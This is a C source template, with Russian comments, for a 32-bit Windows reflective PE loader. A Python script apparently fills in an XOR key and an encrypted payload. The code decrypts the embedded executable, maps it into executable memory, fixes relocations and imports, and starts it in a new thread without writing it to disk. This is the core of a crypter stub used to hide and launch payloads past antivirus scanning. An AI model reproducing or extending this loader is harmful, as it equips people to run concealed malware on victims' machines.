// loader_template.c (x86 version) - Упрощенная версия без OpenSSL
// Reflective PE Loader для 32-битных PE-файлов (x86)

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

// --- Уникальные параметры (подставляются Python-скриптом) ---
unsigned char ENCRYPTION_KEY[32] = { /* ... */ };
unsigned char PAYLOAD[] = { /* ... */ };
unsigned int PAYLOAD_SIZE = 0;


void log_message(const char* msg) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    char* last_slash = strrchr(exe_path, '\\');
    if (last_slash) *(last_slash + 1) = 0;
    char log_path[MAX_PATH];
    sprintf(log_path, "%sloader_debug_x86.txt", exe_path);
    FILE* f = fopen(log_path, "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] %s\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, msg);
        fclose(f);
    }
}


// Простая XOR дешифровка для тестирования
void xor_decrypt_payload(BYTE* encrypted_data, SIZE_T encrypted_size, BYTE* key, BYTE* decrypted_data) {
    log_message("xor_decrypt_payload: start");
    
    for (SIZE_T i = 0; i < encrypted_size; i++) {
        decrypted_data[i] = encrypted_data[i] ^ key[i % 32];
    }
    
    // Проверяем первые байты расшифрованных данных
    char debug_msg[256];
    sprintf(debug_msg, "xor_decrypt_payload: first bytes: %02X %02X %02X %02X", 
            decrypted_data[0], decrypted_data[1], decrypted_data[2], decrypted_data[3]);
    log_message(debug_msg);
    
    log_message("xor_decrypt_payload: completed");
}


HANDLE reflective_load_pe32(unsigned char* pe_data, unsigned int pe_size) {
    log_message("reflective_load_pe32: start");

    // Проверяем минимальный размер
    if (pe_size < sizeof(IMAGE_DOS_HEADER)) {
        log_message("reflective_load_pe32: file too small");
        return NULL;
    }

    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)pe_data;
    
    // Проверяем DOS signature
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        log_message("reflective_load_pe32: invalid DOS signature");
        return NULL;
    }
    
    log_message("reflective_load_pe32: dos_header read");
    
    // Проверяем, что e_lfanew находится в пределах файла
    if (dos_header->e_lfanew >= pe_size || dos_header->e_lfanew < sizeof(IMAGE_DOS_HEADER)) {
        log_message("reflective_load_pe32: invalid e_lfanew");
        return NULL;
    }
    
    IMAGE_NT_HEADERS32* nt_headers = (IMAGE_NT_HEADERS32*)((BYTE*)pe_data + dos_header->e_lfanew);
    
    // Проверяем NT signature
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        log_message("reflective_load_pe32: invalid NT signature");
        return NULL;
    }
    
    log_message("reflective_load_pe32: nt_headers read");

    // Добавляем детальное логирование
    char debug_msg[256];
    sprintf(debug_msg, "reflective_load_pe32: ImageBase=0x%08X, SizeOfImage=%d", 
            nt_headers->OptionalHeader.ImageBase, nt_headers->OptionalHeader.SizeOfImage);
    log_message(debug_msg);

    BYTE* image_base = (BYTE*)VirtualAlloc((LPVOID)nt_headers->OptionalHeader.ImageBase, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!image_base) {
        log_message("reflective_load_pe32: VirtualAlloc failed, trying NULL");
        image_base = (BYTE*)VirtualAlloc(NULL, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(!image_base) {
            log_message("reflective_load_pe32: VirtualAlloc failed");
            return NULL;
        }
    }
    log_message("reflective_load_pe32: VirtualAlloc succeeded");

    memcpy(image_base, pe_data, nt_headers->OptionalHeader.SizeOfHeaders);
    log_message("reflective_load_pe32: headers copied");

    IMAGE_SECTION_HEADER* section_header = (IMAGE_SECTION_HEADER*)((BYTE*)nt_headers + sizeof(IMAGE_NT_HEADERS32));
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        memcpy(image_base + section_header[i].VirtualAddress, pe_data + section_header[i].PointerToRawData, section_header[i].SizeOfRawData);
    }
    log_message("reflective_load_pe32: sections copied");
    
    // Relocations
    DWORD_PTR delta = (DWORD_PTR)image_base - nt_headers->OptionalHeader.ImageBase;
    if (delta != 0) {
        log_message("reflective_load_pe32: processing relocations");
        IMAGE_DATA_DIRECTORY* reloc_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->Size > 0) {
            IMAGE_BASE_RELOCATION* reloc_block = (IMAGE_BASE_RELOCATION*)(image_base + reloc_dir->VirtualAddress);
            while (reloc_block->VirtualAddress) {
                int entries_count = (reloc_block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entry = (WORD*)(reloc_block + 1);
                for (int i = 0; i < entries_count; i++, entry++) {
                    if ((*entry >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* p = (DWORD*)(image_base + reloc_block->VirtualAddress + (*entry & 0xFFF));
                        *p += delta;
                    }
                }
                reloc_block = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc_block + reloc_block->SizeOfBlock);
            }
        }
    }
    log_message("reflective_load_pe32: relocations processed");

    // Imports
    log_message("reflective_load_pe32: processing imports");
    IMAGE_DATA_DIRECTORY* import_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)(image_base + import_dir->VirtualAddress);
        while (import_desc->Name) {
            HMODULE lib = LoadLibraryA((LPCSTR)(image_base + import_desc->Name));
            if (lib) {
                IMAGE_THUNK_DATA32* thunk = (IMAGE_THUNK_DATA32*)(image_base + import_desc->FirstThunk);
                IMAGE_THUNK_DATA32* orig_thunk = (IMAGE_THUNK_DATA32*)(image_base + import_desc->OriginalFirstThunk);
                while (orig_thunk->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL32(orig_thunk->u1.Ordinal)) {
                        thunk->u1.Function = (DWORD_PTR)GetProcAddress(lib, (LPCSTR)IMAGE_ORDINAL32(orig_thunk->u1.Ordinal));
                    } else {
                        IMAGE_IMPORT_BY_NAME* import_by_name = (IMAGE_IMPORT_BY_NAME*)(image_base + orig_thunk->u1.AddressOfData);
                        thunk->u1.Function = (DWORD_PTR)GetProcAddress(lib, import_by_name->Name);
                    }
                    thunk++;
                    orig_thunk++;
                }
            }
            import_desc++;
        }
    }
    log_message("reflective_load_pe32: imports processed");

    LPVOID entry_point = (LPVOID)(image_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    log_message("reflective_load_pe32: entry point calculated");
    
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry_point, image_base, 0, NULL);
    if (!hThread) {
        log_message("reflective_load_pe32: CreateThread failed");
        return NULL;
    }

    log_message("reflective_load_pe32: thread created successfully");
    return hThread;
}

HANDLE run_payload(unsigned char* payload, unsigned int size, unsigned char* key) {
    log_message("run_payload (x86): start");
    
    // Простая XOR дешифровка для тестирования
    SIZE_T decrypted_size = size;
    BYTE* decrypted_data = (BYTE*)VirtualAlloc(NULL, decrypted_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted_data) {
        log_message("run_payload (x86): VirtualAlloc for decrypted_data failed");
        return NULL;
    }
    
    xor_decrypt_payload(payload, size, key, decrypted_data);
    log_message("run_payload (x86): payload decrypted");
    
    HANDLE hThread = reflective_load_pe32(decrypted_data, decrypted_size);

    // We don't free decrypted_data as it's now the running image
    return hThread;
}

int main() {
    HANDLE hThread = run_payload(PAYLOAD, PAYLOAD_SIZE, ENCRYPTION_KEY);
    if (hThread) {
        log_message("main (x86): payload thread created successfully");
        
        // Для GUI приложений не ждем завершения, просто закрываем хендл
        // GUI приложения работают в бесконечном цикле
        log_message("main (x86): GUI application detected, not waiting for completion");
        CloseHandle(hThread);
        log_message("main (x86): loader completed, GUI application should be running");
    }

    return 0;
} 